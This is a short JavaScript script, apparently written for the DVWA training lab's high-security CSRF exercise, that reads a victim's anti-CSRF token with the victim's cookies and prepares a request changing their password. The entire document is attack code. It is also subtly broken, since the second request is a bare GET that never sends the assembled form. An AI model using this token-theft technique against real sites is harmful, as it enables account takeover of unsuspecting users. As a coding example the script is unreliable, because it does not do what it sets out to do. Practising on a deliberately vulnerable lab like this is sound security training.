var theUrl = 'http://localhost/vulnerabilities/csrf/';
var pass = 'high';

fetch(theUrl, {
    method: 'GET',
    credentials: 'include'
}).then(function(response) {
    return response.text();
}).then(function(text) {
    var parser = new DOMParser();
    var doc = parser.parseFromString(text, "text/html");
    var token = doc.getElementsByName('user_token')[0].value;
    console.log(token);
    var form = new FormData();
    form.append('user_token', token);
    form.append('password_new', pass);
    form.append('password_conf', pass);
    form.append('Change', 'Change');
    fetch(theUrl, {
        method: 'GET',
        credentials: 'include'
    }).then(function(response) {
        return response.text();
    }).then(function(text) {
        console.log(text);
    });
});
